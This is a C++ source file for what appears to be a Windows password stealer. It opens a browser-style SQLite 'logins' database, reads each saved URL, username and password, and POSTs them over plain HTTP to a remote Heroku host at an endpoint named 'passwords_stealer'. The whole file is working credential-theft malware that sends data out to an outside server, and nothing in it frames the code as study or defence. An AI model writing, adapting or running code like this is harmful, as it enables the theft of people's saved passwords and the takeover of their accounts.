#include "Sender.h"

LPCWSTR Sender::baseUrl = L"passwords-server-984.herokuapp.com";
LPCWSTR Sender::apiPath = L"api/passwords_stealer/v1/insert";
HINTERNET Sender::hConnect = NULL;

void Sender::sendPasswords(string dbPath)
{
	HINTERNET hSession = WinHttpOpen(L"Program of Frost", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession)
	{
		cout << "Can't start http session";
		exit(GetLastError());
	}
	Sender::hConnect = WinHttpConnect(hSession, baseUrl, INTERNET_DEFAULT_HTTP_PORT, 0);	//can't perfomr https requests yet
		if (!hConnect)
	{
		cout << "Can't establish a connection to the server";
		exit(GetLastError());
	}
	Sender::readPasswords(dbPath);

	if (Sender::hConnect) WinHttpCloseHandle(Sender::hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

}

void Sender::readPasswords(string dbPath)
{
	sqlite3* db;
	//read the database contains login data
	if (sqlite3_open(dbPath.c_str(), &db))
	{
		cerr << "Error: Can't open database\n";
		exit(sqlite3_errcode(db));
	}

	string query = "SELECT url, username, password FROM logins";
	char* error;
	if (sqlite3_exec(db, query.c_str(), Sender::sqlCallback, db, &error) != SQLITE_OK)
	{
		cout << "SQLITE3 error: " << error << endl;
		exit(0x69);
	}
}

int Sender::sqlCallback(void* notUsed, int argc, char** argv, char** azColName)
{
	int status = Sender::sendData(argv[0], argv[1], argv[2]);
	if (status)
	{
		clog << "Error sending data of url: " << argv[0] << endl << "Error code: " << status << endl;
	}
	Sleep(1500);
	return 0;
}

int Sender::sendData(string url, string username, string passwords)
{
	HINTERNET hRequest = WinHttpOpenRequest(Sender::hConnect, L"POST", Sender::apiPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	if (!hRequest) return GetLastError();

	string param = "url=" + url + "&username=" + username + "&password=" + passwords;
	bool bresult = WinHttpSendRequest(hRequest, L"content-type:application/x-www-form-urlencoded", -1, (LPSTR)param.c_str(), param.length(), param.length(), 0);
	if (!bresult) return GetLastError();

	if (hRequest) WinHttpCloseHandle(hRequest);
	return 0;
}